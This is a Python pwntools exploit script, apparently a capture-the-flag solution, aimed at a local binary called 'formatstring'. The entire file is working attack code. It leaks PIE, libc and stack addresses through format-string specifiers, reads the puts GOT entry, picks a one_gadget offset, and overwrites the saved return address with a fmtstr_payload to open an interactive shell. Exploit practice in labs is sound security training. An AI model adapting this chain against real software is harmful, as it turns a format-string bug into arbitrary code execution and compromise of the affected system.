from pwn import *
import subprocess


def get_one_gadgets(libc):
    args = ["one_gadget", "-r"]
    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
        args += ["-b", libc.hex()]
    else:
        args += [libc]
    return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]

elf = context.binary = ELF("./formatstring")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


r = process(elf.path)
r.recvuntil(b"Just type something:\n")


r.sendline(b"%71$p")

pie_leak = r.recvline().strip()
pie_leak = int(pie_leak, 16)


elf.address = pie_leak - 4352

r.sendline(b"n")

r.recvuntil(b"Just type something:\n")
r.sendline(b"%9$s".ljust(8,b"A")+p64(elf.got["puts"]))
puts_libc_leak = u64(r.recv(6).ljust(8,b"\x00"))
libc.address = puts_libc_leak - libc.symbols["puts"]


oneshots = get_one_gadgets(libc.path)
oneshot = libc.address+oneshots[1]

r.sendline(b"n")
r.recvuntil(b"Just type something:\n")
r.sendline(b"%72$p")

stack_leak = r.recvline().strip()
stack_leak = int(stack_leak, 16)
ret_addr_stack = stack_leak - 232


writes = {ret_addr_stack: oneshot}
payload = fmtstr_payload(8, writes, write_size="byte")

r.sendline(b"n")
r.recvuntil(b"Just type something:\n")
r.sendline(payload)

r.sendline(b"\x00"*400)
r.sendline(b"y")

r.interactive()
